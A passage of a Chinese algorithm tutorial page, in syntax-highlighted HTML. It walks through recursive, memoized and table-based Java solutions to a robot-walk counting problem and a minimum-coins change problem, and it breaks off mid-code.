punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">RobotWalk1</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">S</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token class-name">S</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-记忆化搜索"><a href="#2-0-记忆化搜索" class="headerlink" title="2.0 记忆化搜索"></a>2.0 记忆化搜索</h4><blockquote><p>假设 N = 5, E = 4, S = 2, K = 4</p><p>通过上面写的暴力递归版本画出递归过程的草图</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f8.png"></p><p>可以看到f(2,2)被分别调用，分别独立计算多次，导致消耗更多的时间，如果我们将已经算出来过的结果缓存起来，再次调用的时候，直接返回，而不是重新计算，就会节省大量时间</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">,</span> <span class="token keyword">int</span> cur<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> cur <span class="token operator">==</span> <span class="token class-name">E</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token class-name">N</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span>  <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">RobotWalk2</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">S</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">K</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">K</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token class-name">S</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-严格表结构"><a href="#3-0-严格表结构" class="headerlink" title="3.0 严格表结构"></a>3.0 严格表结构</h4><p>画出二维表，整理表中各个数的依赖关系</p><p>N = 5, E = 4, S = 2, K = 4</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f9.png"></p><p>1）首先观察base case</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> cur <span class="token operator">==</span> <span class="token class-name">E</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即rest为0的话，可以确定dp[0]整个一行的值，即4那一列为1，其它列都为0</p><blockquote><p>注意cur不可能为0，因为只能从1 - N，所以cur为0的一列没有意义</p></blockquote><p>2）继续看下面的语句</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cur为1的这一列，每一行都由右上角决定</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f10.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token class-name">N</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cur为N的这一列，每一行都由左上角决定</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">else</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span>  <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cur为2-4的情况，即由左上角 + 右上角决定</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f11.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">RobotWalk3</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">K</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">S</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">K</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">E</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> rest<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">&lt;</span><span class="token class-name">K</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> cur<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>cur<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>cur<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token class-name">N</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> dp<span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>rest<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>cur<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token class-name">K</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">S</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>本题目其实严格表结构和记忆化搜索时间复杂度是相同的，都是O(K*N)</p></blockquote><blockquote><p>改写为严格表结构的步骤：</p><p>1）确定可变参数，几个可变参数就搞几维数组</p><p>2）确定最终目标</p><p>3）base case</p><p>4）搞清表中各个数的依赖关系</p><p>5）确定依次计算的顺序</p></blockquote><h3 id="0x02-题目二"><a href="#0x02-题目二" class="headerlink" title="0x02 题目二"></a>0x02 题目二</h3><p>给定数组 arr，arr 中所有的值都为正数且不重复。每个值代表一种面值的货币，每种面值的货币可以使用任意张</p><p>再给定一个整数 aim，代表要找的钱数</p><p>求组成 aim 的最少货币数</p><blockquote><p>arr=[5,2,3]，aim=20</p><p>4 张 5 元可以组成 20 元，其他的找钱方案都要使用更多张的货币，所以返回 4</p><p>arr=[5,2,3]，aim=0</p><p>不用任何货币就可以组成 0 元，返回 0</p><p>arr=[3,5]，aim=2</p><p>根本无法组成 2 元，钱不能找开的情况下默认返回-1</p></blockquote><h4 id="1-0-暴力递归-1"><a href="#1-0-暴力递归-1" class="headerlink" title="1.0 暴力递归"></a>1.0 暴力递归</h4><p>从数组开头开始尝试</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 还剩rest钱需要找，index为arr的下标</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>index <span class="token operator">==</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> rest <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 要返回的结果，先初始化为-1</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">*</span>arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span>rest<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 当前用了k*arr[index]这些钱，那就还需要找rest-k*arr[index]</span>        <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> rest <span class="token operator">-</span> k<span class="token operator">*</span>arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> result <span class="token operator">=</span> result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> p <span class="token operator">+</span> k <span class="token operator">:</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> p<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">CoinsMin</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> aim<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> aim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> aim<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-记忆化搜索-1"><a href="#2-0-记忆化搜索-1" class="headerlink" title="2.0 记忆化搜索"></a>2.0 记忆化搜索</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>index <span class="token operator">==</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> rest <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 要返回的结果，先初始化为-1</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">*</span>arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">&lt;=</span>rest<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 当前用了k*arr[index]这些钱，那就还需要找rest-k*arr[index]</span>        <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token function">process2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> rest <span class="token operator">-</span> k<span class="token operator">*</span>arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> p <span class="token operator">+</span> k <span class="token operator">:</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">CoinsMin2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> aim<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> aim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>aim<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process2</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> aim<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-严格表结构-1"><a href="#3-0-严格表结构-1" class="headerlink" title="3.0 严格表结构"></a>3.0 严格表结构</h4><h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><p>每个数由下一行的减去k个该index位置的面值的结果决定，取当前k+下一行的每个决定值的最小值</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f15.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">CoinsMin4</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> aim<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> aim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">N</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">N</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token 